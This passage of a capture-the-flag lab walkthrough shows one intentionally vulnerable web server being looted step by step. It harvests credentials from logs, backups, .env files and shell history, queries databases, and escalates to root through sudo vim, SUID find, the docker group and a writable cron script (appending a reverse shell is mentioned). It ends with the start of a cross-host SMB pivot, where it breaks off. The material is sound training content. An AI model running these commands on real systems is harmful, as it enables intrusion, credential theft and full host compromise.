`sub` is **user1**, your own API token, sitting in the clear so a script wouldn't have to prompt. The `machine` line (`api.oc.internal`) even tells you the endpoint it's good against. **Flag 5: `FLAG{M******1}`**

#### Flag 6: a service token an auth daemon logged when it issued it

Auth services are built to leave an audit trail: every login and every token issued is worth logging. The common failure is logging the token value next to the event ("issued token X to Y") instead of just an ID. So you grep auth and app logs on purpose, because authentication events are where IDs and secrets pile up. You're not reading the whole log, you're going straight for the line that mints a credential.

```bash
grep -n 'issued service token' /var/log/oc.log
```
```
4:2026-07-30 22:59:46 oc-auth[1123]: issued service token to svc-auth: eyJhbGci...
```
```bash
d3coder 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdmMtYXV0aCIsImlhdCI6MTcxMDAwMDAwMCwic2NvcGUiOiJpbnRlcm5hbCIsImZsYWciOiJGTEFHe0ZSRUQ2OTkyOTc5Nn0ifQ.kc1-AfcxMbSh1d6azm4zOD5mhYGI6i_Pv7meHFVrpmg'
```
```
{"sub":"svc-auth","iat":1710000000,"scope":"internal","flag":"FLAG{F******6}"}
```

`sub` is **svc-auth**. This log is mode `644` (world-readable), so a token written here is a live credential any local user can lift and reuse. An over-logging bug became a privilege. **Flag 6: `FLAG{F******6}`**

#### Flag 7: a live session JWT in a DEBUG line

DEBUG logging dumps request internals to help a developer trace a problem, and those internals include the caller's session token. Someone turns on debug to chase one bug, a session JWT lands in the log, and the verbosity never gets turned back down. So you grep app logs for `jwt`, `token`, or `session`: you're mining the gap between "debug is temporary" and "debug is still on."

```bash
grep -n 'session_jwt' /var/log/webapp/app.log
```
```
3:[Thu Jul 30 22:59:46 UTC 2026] DEBUG session_jwt=eyJhbGci... user=brandon path=/account
```
```bash
d3coder 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3ZWItdXNlciIsImlhdCI6MTcxMDAwMDAwMCwic2NvcGUiOiJpbnRlcm5hbCIsImZsYWciOiJGTEFHe0dFT1JHRTkwNjc1NDM5fSJ9.pfDgc7cC15pJBLtNcR8NOs8OmgO1paCiVGg-rnGz1Lk'
```
```
{"sub":"web-user","iat":1710000000,"scope":"internal","flag":"FLAG{G******9}"}
```

`sub` is **web-user**, and the log line even names the victim (`user=brandon`) and the page (`/account`). This is a session token, so holding it lets you present yourself to the app as brandon with no password. Decoding it here is session hijacking in miniature. **Flag 7: `FLAG{G******9}`**

#### Flag 8: a "rotate after migration" CI token in a legacy backup

Backup and old-password files pay off because rotation is usually a good intention that never happens. A secret gets copied into a backup during a migration, the migration finishes, and the "temporary" backup lives on with old-but-still-valid credentials inside. You grep `/var/backups` and old-password files to catch exactly the secrets an org believes it already retired.

```bash
grep -niE 'api token|rotate' /var/backups/system/old_passwords.txt
```
```
9:# CI/CD API token (rotate after migration): eyJhbGci...
```
```bash
d3coder 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjaS1sZWdhY3kiLCJpYXQiOjE3MTAwMDAwMDAsInNjb3BlIjoiaW50ZXJuYWwiLCJmbGFnIjoiRkxBR3tST041MTc4OTIwMn0ifQ.phT6KMXoxobnT0E-eYrIjdcEb6J4UVm2pDc3ALLnRqI'
```
```
{"sub":"ci-legacy","iat":1710000000,"scope":"internal","flag":"FLAG{R******2}"}
```

`sub` is **ci-legacy**, and the comment spells out the intent to rotate that nobody followed through on. This file also carries a plaintext `FLAG{DECOY_*}` string, and the thing that saves you is the same judgment as always: the real credential is the JWT, not the item conveniently labelled like a flag. **Flag 8: `FLAG{R******2}`**

#### Flag 9: a session token in a hidden file a systemd unit keeps alive

Two of your sweep hits are related: `/tmp/.hidden/secret.txt` and `/etc/systemd/system/oc-hidden-flag.service`. That pairing is the tell. Ask why a file in `/tmp`, the one directory that's supposed to be throwaway, keeps existing. Because a service keeps re-dropping it. Spotting "there's a unit whose job is to recreate this file" is how you recognize a rough persistence setup, and persistence artifacts are where operators stash things they want to survive a cleanup.

```bash
ls -l /tmp/.hidden/secret.txt
head -c 80 /tmp/.hidden/secret.txt
```
```
-rw-r--r-- 1 root root 200 Aug 21 04:25 /tmp/.hidden/secret.txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3ZWItc2Vzc2lvbiIs...
```

Check the perms first (`-rw-r--r--`). Root owns it, but it's world-readable, so you take it as `user1` with no escalation. Read the perms before you wonder whether you're allowed.

```bash
d3coder 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3ZWItc2Vzc2lvbiIsImlhdCI6MTcxMDAwMDAwMCwic2NvcGUiOiJpbnRlcm5hbCIsImZsYWciOiJGTEFHe05FVklMTEU4NDM4NDg4MH0ifQ.cpjHPTm3GZr68zdCiCXW15X92DCYy5Tv2LzgTB7AGgI'
```
```
{"sub":"web-session","iat":1710000000,"scope":"internal","flag":"FLAG{N******0}"}
```

**Flag 9: `FLAG{N******0}`**

#### Flag 10: a worker's service token in a world-readable `.env`

Modern "12-factor" apps push configuration and secrets into environment files so the same code runs in dev, staging, and prod. The predictable weakness is that those files hold live secrets and tend to be over-permissioned (world-readable), because people treat them as config rather than credentials. So you read every `.env` under the app's install directory.

```bash
cat /opt/oc/configs/service.env
```
```
# OC background worker config
WORKER_CONCURRENCY=4
SERVICE_TOKEN=eyJhbGci...
```
```bash
d3coder 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3b3JrZXIiLCJpYXQiOjE3MTAwMDAwMDAsInNjb3BlIjoiaW50ZXJuYWwiLCJmbGFnIjoiRkxBR3tCRUxMQVRSSVgzMDUwMDY1Mn0ifQ.HNUDFzutLsJwz_sTyYB78omJe2y9VFEhZvIjnNzTK1w'
```
```
{"sub":"worker","iat":1710000000,"scope":"internal","flag":"FLAG{B******2}"}
```

`sub` is **worker**, the background worker's own identity, in a file any local user can read. **Flag 10: `FLAG{B******2}`**

#### Flag 11: a token pasted into shell history

The reason a token lands in `~/.bash_history` is the most human one on the box: a developer pastes a working `curl` command, bearer token and all, straight into the shell to test an endpoint, and history keeps it. You check it first because it costs nothing and you are already `user1`.

```bash
grep -n 'eyJ' ~/.bash_history
```
```
3:curl -s -H "Authorization: Bearer eyJhbGci..." http://127.0.0.1:8899/whoami
```

The token is the `Bearer` value. Extract and decode it with the same `dj` helper:

```bash
d3coder 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsImlhdCI6MTcxMDAwMDAwMCwic2NvcGUiOiJpbnRlcm5hbCIsImZsYWciOiJGTEFHe0hBUlJZNzIyMjkzNzN9In0.zmvwY3OjbrcoCWqS2EJvQ14BbnbNuG_vGgyTU2L_KcY'
```
```
{"sub":"user1","iat":1710000000,"scope":"internal","flag":"FLAG{H******3}"}
```

`sub` is **user1** (your own token), and the history line even shows the internal endpoint it was aimed at (`127.0.0.1:8899/whoami`, the same API you loot in Flags 16-17). **Flag 11: `FLAG{H******3}`**

**What to take away from this section.** Seven tokens, seven different reasons a credential leaks: a helper cache, a `.netrc`, an auth log, a debug log, a stale backup, a persistence file, a service `.env`. The point isn't "run these seven commands." It's that you knew the shape of what you were hunting so search would find it and look-alikes wouldn't fool you, you asked "why would a token be here?" at every hit, and you read the `sub` to learn whose identity you now hold. That identity, not the flag, is what gets you into the next system.

**Flags found:** Flag 4 `FLAG{H******5}`, Flag 5 `FLAG{M******1}`, Flag 6 `FLAG{F******6}`, Flag 7 `FLAG{G******9}`, Flag 8 `FLAG{R******2}`, Flag 9 `FLAG{N******0}`, Flag 10 `FLAG{B******2}`, Flag 11 `FLAG{H******3}`

**Flag 12: network credentials (the cross-host key).** Read the secrets directory. A file literally named
`network_credentials.txt` holds a base64 flag **and Windows creds** (save those; they drive the pivot).

**Why we go after this.** Organizations constantly write down credentials for other systems in flat files:
a runbook, a "network credentials" note, a deployment script, because a human or a scheduled job needs to
authenticate somewhere and plaintext is the path of least resistance. A file literally named
`network_credentials.txt` in a `/opt/secrets` directory is therefore some of the highest-value loot on the
box: it is not a flag for its own sake, it holds *working* credentials for *another* machine. We reason our
way here from the whole engagement's shape: we were told at the top that the creds we loot open the Windows
server, so once we have a user shell we go looking for exactly the kind of cross-host credential store that
would form that bridge. The base64 flag in the file is a bonus; the real prize is the `user1 / Password123!`
Windows Server 2019 login, which we save now because it is what turns a single-host web compromise into a
network compromise at the very end. This is the pivot key, so treat it as the most important thing you find
in this phase.

```bash
cat /opt/secrets/network_credentials.txt
```

**Expected output:**

```
** Windows Server 2019 Server Credentials **
Username: user1
Password: Password123!
...
RkxBR3t…                              # d3coder -> FLAG{…}
```

```bash
grep -oE 'RkxBR3t[A-Za-z0-9+/=]+' /opt/secrets/network_credentials.txt | d3coder
```

**Reading the output.** The header names a Windows Server 2019 host and the file spells out
`user1 / Password123!`, the exact credential that lands the pivot later. The `RkxBR3t…` line is base64 for a
string starting `FLAG{`, so a quick `d3coder` reveals the flag.

**Command breakdown**
- Save those Windows creds; they drive the cross-host pivot at the end of this guide.

**The lesson.** Plaintext credential files that reference *other* hosts are how one compromised box becomes a
compromised network; secrets belong in a vault with per-host, non-reused credentials. As the attacker, always
save every working credential you find and note where else it might authenticate, because reuse across hosts
is the thread that unravels the environment.

**Flag 12 found:** `FLAG{H******1}`

**Database flags.** The creds leak, the flags live in the DB. A Postgres flag lives in a *customer record*
(find the leaked pg cred in a backup script and `psql`). Two MySQL flags live in `internal.secrets`, reached
via a world-readable `.cnf` that auto-loads a cred (so `mysql -e "SELECT ..."` just works, no password
prompt: that is the vuln).

**Why we go after this.** These databases never showed up in our external nmap because they bind to
localhost, so they are only reachable now that we have a shell on the box, which is the internal-recon payoff
we flagged in Phase 1. The teaching point is *where database credentials leak*: a backup script has to
authenticate non-interactively, so it hard-codes the password (here `export PGPASSWORD=...`), and a MySQL
client config like `/etc/mysql/conf.d/oc.cnf` is *auto-loaded* by the `mysql` client on every invocation, so
if it is world-readable, any user's `mysql -e "..."` silently inherits that credential with no password on
the command line. That auto-load-plus-world-readable combination is the actual vulnerability, and it is
common in the real world because admins make config files readable "so the app can start" and forget who else
can read them. The second teaching point is that the flags here are not strings in any file: they are *rows*,
so grepping the filesystem finds nothing and only a real query returns them. So we reason: find the leaked
cred in the script and the config, connect, and `SELECT`, one flag hiding in a customer record, two more in
an `internal.secrets` table.

**Flag 13 (Postgres): a flag hidden in a customer record.** The Postgres cred is leaked in the backup script, so recover it and query the `customers` table. The flag is planted in the `notes` field of an audit-contact record, so a file grep never finds it and only a `SELECT` returns it:

```bash
grep PGPASSWORD /opt/oc/scripts/pg_backup.sh
PGPASSWORD='Pg_App_S3cret!' psql -h localhost -U oc_app -d ocdb -c "SELECT * FROM customers;"
```

**Expected output:**

```
export PGPASSWORD='Pg_App_S3cret!'
 id |      name      |         email          |       notes
----+----------------+------------------------+--------------------
  1 | Internal Audit | audit@chchcheckit.com  | FLAG{L******6}      <-- Flag 13 (in the notes column)
  2 | Alice Reyes    | areyes@chchcheckit.com | VIP account
```

**Flags 14 and 15 (MySQL): two named secrets in one table.** MySQL is reached through a different leak: `/etc/mysql/conf.d/oc.cnf` is world-readable and auto-loaded by the `mysql` client on every invocation, so `mysql -e "..."` inherits the credential with no password on the command line. The `internal.secrets` table holds two named rows, and each is its own flag:

```bash
mysql -e "SELECT * FROM internal.secrets;"
```

**Expected output:**

```
name                    value
monitoring_key          FLAG{M******0}      <-- Flag 14 (monitoring_key)
rails_secret_key_base   FLAG{G******8}      <-- Flag 15 (rails_secret_key_base)
```

**Reading the output.** The Postgres flag arrives embedded in a *customer* row (the audit contact record),
so you find it by querying the table, not by reading a file. The MySQL command needed no `-p` at all: the
world-readable, auto-loaded `.cnf` supplied the credential silently, which is precisely the misconfiguration
being demonstrated.

**Command breakdown**
- The Postgres cred is leaked in the backup script (`PGPASSWORD=`), so `psql -U oc_app -d ocdb` connects and the flag is a *customer record*. For MySQL, `/etc/mysql/conf.d/oc.cnf` is world-readable and **auto-loaded by the mysql client**, so `mysql -e "..."` inherits the cred with no password on the command line.
- Flags in a database are not in any file to grep; you must *query*. An auto-loading client config (`~/.my.cnf` / `conf.d/*.cnf`) is a real-world credential exposure.

**Flag teaching.** Any client that speaks the protocol works in place of the CLI: DBeaver or `psql`/`mysql` GUIs reach the same rows, and the same auto-loading `.cnf` trick applies to any `~/.my.cnf` or `conf.d/*.cnf` a real box leaves world-readable.

**The lesson.** Do not hard-code database passwords in scripts or leave client config files world-readable,
because an auto-loading `.cnf` hands its credential to anyone who can run the client. As the attacker,
remember that data lives in tables: when a file sweep comes up empty, the answer is usually a query away.

**Flags found:** Flag 13 `FLAG{L******6}`, Flag 14 `FLAG{M******0}`, Flag 15 `FLAG{G******8}`

**Internal API flags.** Something listens on `127.0.0.1:8899` (find it with `ss -ltn`). It answers only with
a valid `?key=`. Two keys leak in the environment (a `/etc/profile.d/` script, a systemd service). `curl` it.

**Why we go after this.** A service that binds to `127.0.0.1` accepts connections only from the machine
itself, so it is deliberately invisible to any external scan: our Phase 1 nmap could never have seen it. That
localhost binding is often treated as security ("only local processes can reach it"), but that assumption
collapses the instant an attacker has *any* shell on the host, which we now do. Internal APIs like this exist
because microservices and monitoring agents talk to each other over loopback, and they commonly gate access
with a shared secret passed as `?key=` rather than real authentication. So we reason in two steps: first
enumerate what is listening internally with `ss -ltn` (the tool that reveals the loopback-only surface nmap
missed), then hunt for the key the service expects. Keys leak where a service can conveniently read them at
startup: exported in a shell profile under `/etc/profile.d/`, or set in a systemd unit's `Environment=`
directive. Recover a key, `curl` the endpoint, and it returns its secret, teaching that "internal only" is
not an access control once the perimeter is breached.

First confirm the service is really there:

```bash
ss -ltn | grep 8899
```
```
LISTEN 0  5  127.0.0.1:8899  0.0.0.0:*   users:(("python3",pid=453,fd=3))
```

It's bound to `127.0.0.1`, which is why an external scan never saw it, and it's a small Python service that answers only when you present a valid key. Two keys leak in two different startup locations, and each one returns its own flag, so you recover both and call the endpoint twice.

**Flag 16, the key exported in a shell profile:**

```bash
OC_API_KEY=$(grep -oE "OC_API_KEY='[^']+'" /etc/profile.d/oc.sh | cut -d"'" -f2)
curl -s "http://127.0.0.1:8899/?key=$OC_API_KEY"
```
```
export OC_API_KEY='f7bcd93accf7...'
{"status":"ok","secret":"FLAG{D******3}"}
```

**Flag 17, the key set in a systemd unit's `Environment`:**

```bash
OC_MONITOR_KEY=$(systemctl show oc-monitor -p Environment | grep -oE 'OC_MONITOR_KEY=[a-f0-9]+' | cut -d= -f2)
curl -s "http://127.0.0.1:8899/?key=$OC_MONITOR_KEY"
```
```
OC_MONITOR_KEY=ef1ce5cd1522...
{"status":"ok","secret":"FLAG{V******8}"}
```

The two responses are genuinely different secrets from the same endpoint, one per key, which is the reason you don't stop after the first. And watch the decoy: that same profile also exports a stale `API_KEY='sk-1234567890abcdef'` that looks like a real API key. The service rejects it:

```bash
curl -s "http://127.0.0.1:8899/?key=sk-1234567890abcdef"
```
```
{"status":"unauthorized","hint":"valid X-API-Key / ?key= required"}
```

A credential that looks valid isn't, so you verify it against the service rather than assuming. The `OC_`-prefixed keys are the working ones; the `sk-` string is bait.

**Command breakdown**
- `ss -ltn` lists listening TCP sockets (find the `127.0.0.1:8899` service); the API answers only with a valid `?key=`. One key leaks in a shell profile, the other in a systemd unit's `Environment`.
- Localhost-bound services are invisible to an external scan; you only meet them once you are on the box. Enumerate `ss -ltnp`, then hunt the key the service expects.

**Flag teaching.** If `ss` is missing, `netstat -ltnp` or `lsof -i` lists the same loopback service, and `wget -qO-` fetches the endpoint just as `curl` does once you hold a valid key.

**The lesson.** Binding to localhost is not authentication; anything on the host can reach a loopback service,
so it still needs real access control and its keys kept out of world-readable profiles and unit files. As the
attacker, always re-enumerate the internal listening surface after you land a shell, because the most
valuable services are the ones the perimeter scan never saw.

**Flags found:** Flag 16 `FLAG{D******3}`, Flag 17 `FLAG{V******8}`

**SUID / config / archive / crypto flags.** A **SUID** binary (`find / -perm -4000`) that prints its own
flag; a base64 line in your `sudo` rule's file and in a cron script; a base64 blob in the "vulnerable binary"
(`strings`); and an `openssl`-encrypted file whose passphrase is a *very common* one.

**Why we go after this.** This group bundles four different secret-storage forms so you drill the reflex of
recognizing each. A **SUID** binary is an executable with the set-user-ID bit set, so it runs with the
privileges of its *owner* (often root) no matter who launches it: `find / -perm -4000` is the standard hunt
for them, because a SUID program that does something unsafe is a classic privilege-escalation and
secret-disclosure vector, and here `backup_tool` simply prints its own flag. **Base64** is encoding, not
encryption, so a `[A-Za-z0-9+/=]`-heavy blob in a sudoers file or a cron script is a decode away from
plaintext; these live in config and automation because someone "obfuscated" a value by base64-ing it,
mistaking encoding for protection. A compiled binary can carry an embedded base64 string too, which is why we
run `strings` to pull printable text out of `vulnerable_binary` before decoding. Finally, an
**openssl**-encrypted file is real symmetric crypto, but it is only as strong as its passphrase, and here the
passphrase is a very common one (`password123`) that a wordlist with `john` would crack in moments. We reach
for all of these now because a real user shell is exactly what lets us run the SUID tool, read the config
files, `strings` the binary, and try the weak passphrase against the AES blob.

#### Flag 18: a SUID-root binary that reads a file you can't

On Linux, the set-user-ID bit means a program runs with its owner's privileges, not those of whoever launched it. That's fine for `passwd`, which has to edit `/etc/shadow`, but any custom SUID-root program that touches files or runs commands is a privilege-escalation candidate. It's a small pocket of root you're allowed to invoke. So the standard enumeration lists every SUID binary and looks for the ones that don't belong:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Why this exact command: `-perm -4000` matches the set-UID bit specifically, and `2>/dev/null` throws away the permission-denied noise from directories you can't enter, since you care about results, not errors.

```
/usr/lib/openssh/ssh-keysign
/usr/bin/sudo   /usr/bin/passwd   /usr/bin/mount  ...   (expected: stock system SUIDs)
/usr/local/bin/backup_tool                              (not stock: a custom tool)
/opt/oc/vulnerable_binary                               (not stock; this is Flag 21)
```

Here's the reasoning that finds the flag. You don't audit all of them. You know roughly what a stock Debian SUID set looks like (`sudo`, `mount`, `passwd`, `su`), so the two under `/usr/local/bin` and `/opt` stand out because they're non-standard. Confirm the bit:

```bash
ls -l /usr/local/bin/backup_tool
```
```
-rwsr-xr-x 1 root root 16632 Aug  1 01:40 /usr/local/bin/backup_tool
```

The `s` in `rws` is the SUID bit, so it runs as root (its owner) for anyone who calls it. Run it:

```bash
/usr/local/bin/backup_tool
```
```
Backup Tool v1.0
FLAG{S******4}

Enter file to backup:
```

It printed a flag from a root-only file, and it could only do that because the process ran as root. That's the SUID idea in one line. The `Enter file to backup:` prompt is more dangerous than the flag: a SUID-root program that will open any path you hand it is an arbitrary-file-read-as-root primitive, so you can point it at any root-only file and have it read that out too. **Flag 18: `FLAG{S******4}`**

#### Flag 20: base64 hidden in a world-writable automation script

Automation like cron and `sudo` scripts runs privileged and unattended, which makes it a favorite spot to stash a secret, and a favorite spot for someone to "hide" one by base64-encoding it, mistaking encoding for encryption. Two things are worth checking on any such script: its permissions (who can tamper with a privileged script?) and any long base64 run inside it.

```bash
ls -l /opt/scripts/cleanup.sh
grep -nE '[A-Za-z0-9+/=]{20,}' /opt/scripts/cleanup.sh
```
```
-rwxrwxrwx 1 root root 137 Aug  1 01:29 /opt/scripts/cleanup.sh
5:echo "RkxBR3tMVVBJTjkxNTQ2ODM5fQ=="
```

The `-rwxrwxrwx` (777) is a serious finding on its own, since a world-writable script that runs privileged is the Phase-6 cron privesc path, but for this flag we just want the encoded string. The `{20,}` length floor filters out short, incidental base64-looking matches, because real secrets are long. Decode:

```bash
grep -oE '[A-Za-z0-9+/=]{20,}' /opt/scripts/cleanup.sh | head -1 | d3coder
```
```
FLAG{L******9}
```

Base64 is a reversible transform, not a cipher. There's no key, so "hiding" a secret this way protects it from no one. **Flag 20: `FLAG{L******9}`**

#### Flag 21: a base64 blob compiled into a binary (`strings`)

People assume that once a secret is compiled into a binary it's hidden. It isn't. Literal strings survive compilation intact in the binary's data sections, and `strings` prints every printable run. So before any heavier reverse-engineering you run `strings` on an interesting binary, because it's the cheapest way to surface hard-coded URLs, keys, and here a base64 blob.

```bash
ls -l /opt/oc/vulnerable_binary
strings /opt/oc/vulnerable_binary | grep -nE '[A-Za-z0-9+/=]{24,}'
```
```
-rwsr-sr-x 1 root root 15976 Jul 30 22:59 /opt/oc/vulnerable_binary
12:d3coder "RkxBR3tOQUdJTkk1MzA3MjE3Nn0="
```

`strings` pulled the literal shell line the binary runs internally. The secret was never really hidden. Decode the embedded blob:

```bash
strings /opt/oc/vulnerable_binary | grep -oE '[A-Za-z0-9+/=]{24,}' | head -1 | d3coder
```
```
FLAG{N******6}
```

The binary is also SUID+SGID and built `-fno-stack-protector`, which dangles a buffer-overflow exercise, but the thinking says take the cheapest reliable route first: `strings` plus a decode beats writing an exploit. **Flag 21: `FLAG{N******6}`**

#### Flag 22: an AES blob with a weak passphrase

Unlike base64, `openssl enc` is real symmetric encryption, but a cipher is only as strong as its passphrase, and people reuse weak ones. The box even leaves a hint. So the reasoning goes: this is genuine crypto, so you can't just decode it, but if the passphrase is a common word then a guess or a wordlist breaks it fast.

```bash
ls -l /opt/oc/encrypted_flag.enc
cat /opt/oc/*hint* 2>/dev/null
```
```
-rw-r--r-- 1 root root 48 Jul 30 22:59 /opt/oc/encrypted_flag.enc
Hint: Weak encryption password used (common password)
```

Decrypt with the guessed passphrase:

```bash
openssl enc -aes-128-cbc -d -salt -pass pass:password123 -in /opt/oc/encrypted_flag.enc
```
```
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
FLAG{H******8}
```

It gave back plaintext because `password123` was the passphrase, the box's own reused weak password. If you hadn't guessed it, you'd feed the file to `john` or `hashcat` against a wordlist. The transferable skill is recognizing that the passphrase is weak, not the lucky guess itself. **Flag 22: `FLAG{H******8}`**

> **Flag 19 (`/etc/sudoers.d/oc_flag`) is deferred to Phase 6.** That drop-in is `chmod 440 root:root`, so as
> `user1` it returns `Permission denied`. Verify it yourself:
> ```
> $ cat /etc/sudoers.d/oc_flag
> cat: /etc/sudoers.d/oc_flag: Permission denied
> ```
> It's a genuinely root-only flag, so you collect it after you escalate (see Phase 6, Step 3). `backup_tool`
> reads as `user1` only because it is SUID-root; `cleanup.sh` and `vulnerable_binary` are world-readable.

**Flags found:** Flag 18 `FLAG{S******4}`, Flag 20 `FLAG{L******9}`, Flag 21 `FLAG{N******6}`, Flag 22 `FLAG{H******8}` *(Flag 19 is root-only, collected in Phase 6)*

**Flag 23: an ssh key inside an archive lets you become another user.** A backup archive hides an ssh key. Use
it to become another user and read their flag.

**Why we go after this.** An ssh private key *is* a credential: whoever holds it can log in as that key's
owner without knowing any password, which is why keys are as good as passwords and often better (they are
frequently exempt from the lockout and brute-force defenses that guard passwords). Backup archives are a
notorious place to find one, because when someone tars up a home directory or a project for safekeeping,
`~/.ssh/id_ed25519` gets swept in with everything else and the archive lingers in `/var/backups` long after
anyone remembers it holds a live key. We reason our way here as part of the same loot sweep: an old tarball is
worth extracting because of what might be inside it, and a private key is the highest-value thing it
could carry. This key logs us in as a *different* account (`svc_backup`), which is lateral movement, it widens
our reach across the box's users before we make the final push to root. One operational detail: ssh refuses to
use a key with loose permissions, so we `chmod 600` it first.

```bash
tar xzf /var/backups/old_project.tar.gz          # yields id_ed25519 (+ notes.txt)
chmod 600 id_ed25519
ssh -i id_ed25519 svc_backup@localhost 'cat ~/flag.txt'
```

**Expected output:**

```
FLAG{…}
```

**Reading the output.** The `ssh -i` command logged us straight in as `svc_backup` with no password prompt,
because the looted key authenticated us, and `cat ~/flag.txt` reads that user's flag from their own home
directory. We are now a second real user on the box.

**Command breakdown**
- `tar xzf` extracts the gzip archive; `chmod 600` fixes key permissions (ssh refuses a world-readable key); `-i id_ed25519` authenticates with the looted key as a *different* user.
- A private key is a credential. Backups and archives are a classic place to find one that unlocks another account.

**Flag teaching.** Hunt archives and keys wholesale: `find / -name '*.tar.gz'` and `find / -name 'id_*'` (or a `linpeas` run) surface backups like this one, and if the key is passphrase-protected, `ssh2john` plus `john` cracks it.

**The lesson.** Protect private keys like passwords, keep them out of backups and archives, and use
passphrase-protected keys so a stolen file is not instantly usable. As the attacker, always extract old
archives, because a single leaked key hands you another identity and expands the board before you escalate.

**Flag 23 found:** `FLAG{T******2}`

---

## Phase 6: Privilege escalation to root

> **The thinking.** We hold a real user but the last flags and full control of the box live behind root, so
> this final rung answers how our unprivileged account crosses that line. We enumerate the standard
> escalation vectors (sudo rights, group membership, writable root-owned cron) rather than fixating on one,
> because the lab deliberately ships three independent paths. The decision here is to confirm every vector
> before committing, so a student learns there is rarely a single way up.

**Goal.** Escalate to root, where the last flags live. The box ships **five independent paths** on purpose , 
you enumerate them all, then pick the cleanest.
**Try.** Enumerate first (`id`, `sudo -l`, SUID sweep, cron), *then* exploit whichever vector you like.

**Why we do this.** Privilege escalation is finding something our unprivileged user is *allowed* to do that
crosses into root. You never guess the vector, you run the standard local-enumeration sweep and let the box
tell you. The catch that makes so many of these dangerous is that everyday programs can spawn a shell from
*inside* themselves (editors, pagers, interpreters, SUID utilities), so a `NOPASSWD` sudo right on `vim`, or
the SUID bit on `find`, is not "edit files as root", it is "run any command as root." That family of tricks
is catalogued at [GTFOBins](https://gtfobins.github.io), and recognizing it is the skill.

#### Step 1: enumerate every escalation vector (this is the whole skill)

Run the four standard checks (or let `linpeas`/`pspy` do it). Each line of output *is* a candidate path, you
don't touch an exploit until enumeration surfaces it:

```bash
id                                   # what groups am I in?
sudo -l                              # what may I run as root?
find / -perm -4000 -type f 2>/dev/null   # which binaries are SUID-root?
ls -la /etc/crontab /opt/scripts/    # any root cron I can write to?
```

**Expected output:**

```
uid=1000(user1) gid=1000(user1) groups=1000(user1),999(docker)   <-- docker group = root-equivalent
User user1 may run the following commands:
    (ALL) NOPASSWD: /usr/bin/vim                                 <-- GTFOBins sudo escape
/usr/bin/find                                                    <-- SUID find (GTFOBins)
/usr/local/bin/backup_tool                                       <-- custom SUID binary
/opt/oc/vulnerable_binary                                        <-- SUID
-rwxrwxrwx 1 root root ... /opt/scripts/cleanup.sh               <-- world-writable, runs as root via cron
```

Five distinct roads to root. Any one is enough; here are the cleanest.

#### Step 2: pick a vector and exploit it

**A, sudo + GTFOBins (instant):**

```bash
sudo vim -c ':!/bin/bash'          # vim's :! spawns a shell, and sudo runs it as root
```

**B, SUID `find` (GTFOBins, needs no sudo):**

```bash
find . -exec /bin/sh -p \; -quit   # -p keeps the SUID-root euid -> root shell
```

**C, docker group (root-equivalent daemon):**

```bash
docker run -v /:/mnt --rm alpine cat /mnt/root/.docker_flag   # mount host / -> read any root file
```

Gives **Flag 24 `FLAG{G******0}`** (`/root/.docker_flag`), and mounting `/` is full root.

**D, world-writable root cron** `/opt/scripts/cleanup.sh` (runs as root every 5 min): append a reverse shell
and wait one tick.

**Expected output (any path, you land as root):**

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Step 3: collect the root-only flags

These files are `chmod 600`/root-owned, so they were **unreadable** until you actually escalated (that gate is
the point, a low-priv `cat` returns `Permission denied`):

**Flag 19** was the `440 root:root` `sudoers.d` drop-in that gave you `Permission denied` back in Phase 5. Its token is base64 on the second field, so decode it now that root can read the file:

```bash
cat /etc/sudoers.d/oc_flag | cut -d' ' -f2 | d3coder
```
```
FLAG{S******6}
```

**Flag 24** is the docker-group reward you already reached by mounting `/`, read here straight off the root filesystem:

```bash
cat /root/.docker_flag
```
```
FLAG{G******0}
```

**Flag 25**, the final flag, is the classic `/root/root.txt`:

```bash
cat /root/root.txt
```
```
FLAG{R******3}
```

**Reading the output.** The enumeration sweep in Step 1 is what surfaced all five vectors, SUID sweep,
`sudo -l`, and `id` each named a path. Once root, the last flags are just files that root alone can read,
including Flag 19, the token in the root-only `sudoers.d/oc_flag` that returned `Permission denied` back in
Phase 5.

**Command breakdown**
- `find / -perm -4000 -type f` lists SUID-root binaries; `backup_tool`, SUID `find`, and `/opt/oc/vulnerable_binary` are all GTFOBins-style escapes. `find . -exec /bin/sh -p` keeps the elevated euid so the shell is root.
- `sudo -l` names the `NOPASSWD` editor (`vim :!` -> root); `id` reveals `docker` group membership (the daemon runs as root, so a container mounting `/` reads any root file).
- Five independent paths (sudo GTFOBins, SUID find, SUID backup_tool, docker group, writable root cron) all exist so students learn there is rarely one way up.

**Flag teaching.** Look up the exact escape for any SUID or sudo-allowed binary on GTFOBins, and let `linpeas` or `pspy` run the whole sweep for you: they flag the sudo rule, every SUID binary, the docker group, and the writable root cron automatically.

**The lesson.** Grant sudo narrowly and never on programs that can spawn a shell (check GTFOBins before you
whitelist a binary), keep the `docker` group tightly restricted because it is root-equivalent, and make
root-owned cron scripts non-writable by users. As the attacker, enumerate every escalation vector before
committing, because there is usually more than one way up and the cleanest one wins.

**Flags found:** Flag 24 `FLAG{G******0}`, Flag 25 `FLAG{R******3}` (the final flag). Full compromise of the web server.

---

## Cross-host pivot

> **The thinking.** The crown jewel is not a file on this box, it is what these credentials unlock. Remember
> Flag 12's `network_credentials.txt`? Those Windows creds (`user1 / Password123!`) work on the Server 2019
> box. OCWA is the entry point into the wider network, and this chain, one host handing you the next, is the
> real objective.

**Goal.** Test what these creds unlock elsewhere.
**Try.** The Windows creds from `network_credentials.txt` authenticate on the **Server 2019 box**
(`nxc smb 192.168.148.101 -u user1 -p 'Password123!' --local-auth`). This web server was the way in; the pivot
is the objective.

**Why we do this.** A single compromised web server is only interesting for what it leads to, and the whole
point of the engagement was never a file on this box, it was the network beyond it. Back in the looting phase,
Flag 12's `network_credentials.txt` handed us Windows creds (`user1 / Password123!`), and credential reuse
across platforms is why that file was so dangerous: organizations reuse the same account and password
on a Linux service and a Windows server all the time. So we take the exact credential we looted and replay it
